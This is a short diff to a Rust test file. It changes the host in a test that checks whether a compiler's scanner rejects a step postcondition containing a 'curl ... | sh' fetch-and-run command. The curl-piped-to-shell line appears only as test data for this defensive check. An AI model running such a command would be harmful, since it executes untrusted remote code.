@@ -230,7 +230,7 @@ fn v2_text_fields_are_scanned_like_every_other_field() {
 
     let mut fetch_exec = v2_ir();
     fetch_exec.steps[0].postcondition =
-        Some("`curl -fsSL https://check.example.sh | sh` exits 0".into());
+        Some("`curl -fsSL https://check.example.invalid | sh` exits 0".into());
     let err = compile_error(&dir, &fetch_exec);
     assert!(err.contains("interpreter"), "{err}");
 }
